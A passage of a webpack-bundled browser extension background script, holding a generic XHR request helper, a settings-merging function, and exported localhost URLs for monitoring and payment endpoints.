                    /*console.info(options.data);*/
                    request.send(JSON.stringify(options.data));
                }
                if (dataType === 'formData') {
                    let formData = new FormData();
                    Object.keys(options.data).forEach(function (key) {
                        formData.append(key, options.data[key]);
                    });
                    /*console.info(options.data);
                    console.info(formData);*/
                    request.send(formData);
                }
            }
            else {
                request.send();
            }
            /*console.info('sending data with xhr request');*/
            request.onreadystatechange = function () {
                if (this.readyState === 4 && this.status === 200) {
                    /*console.info('getting data with xhr request');
                    console.log(this.responseText);*/
                    if (IsJsonString(this.responseText)) {
                        let data = JSON.parse(this.responseText);
                        if (callback) {
                            callback(data);
                        }
                    }
                }
            };
        }
        else {
            console.error("Error: METHOD and URL empty.");
        }
    }
    else {
        console.error("Error: Invalid options.");
    }
    console.groupEnd();
}
function optimizeAppSettingObject(setting, options, callbackFn, fallbackFn) {
    /*console.log(setting);
    console.log(options);
    console.log(Object.keys(setting));*/
    if (options.length !== 0) {
        options.forEach(function (item) {
            Object.keys(item).forEach(function (__opt_Key) {
                Object.keys(setting).forEach(function (__obj_Key) {
                    if (__opt_Key === __obj_Key) {
                        item[__opt_Key].forEach(function (__opt_sub_key) {
                            Object.keys(setting[__obj_Key]).forEach(function (__obj_sub_key) {
                                if (__opt_sub_key !== __obj_sub_key && __obj_sub_key === '') {
                                    /*console.log("__opt_sub_key undefined...");
                                    console.log(__opt_sub_key);*/
                                    if (fallbackFn) {
                                        return fallbackFn();
                                    }
                                } /*else {
                                    console.log("__obj_Key...");
                                    console.log(__obj_Key);
                                    console.log("setting[__objKey]...");
                                    console.log(setting[__obj_Key]);
                                    console.log("[__sub_key]...");
                                    console.log(__obj_sub_key);
                                    console.log("setting[__objKey][__sub_key]...");
                                    console.log(setting[__obj_Key][__obj_sub_key]);
                                }*/
                            });
                        });
                    }
                });
            });
        });
        if (callbackFn) {
            return callbackFn(setting);
        }
    }
}


/***/ }),

/***/ "./assets/ts/lib-main.ts":
/*!*******************************!*\
  !*** ./assets/ts/lib-main.ts ***!
  \*******************************/
/*! exports provided: globalAppMonitorURL, appPaymentURL */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "globalAppMonitorURL", function() { return globalAppMonitorURL; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "appPaymentURL", function() { return appPaymentURL; });

/*required variables*/
let globalAppMonitorURL;
let appPaymentURL;
/*initialize on extension installed*/
globalAppMonitorURL = 'http://localhost/monitor/browser/';
appPaymentURL = 'http://localhost/payment/';


/***/ })

/******/ });
//# sourceMappingURL=background.js.map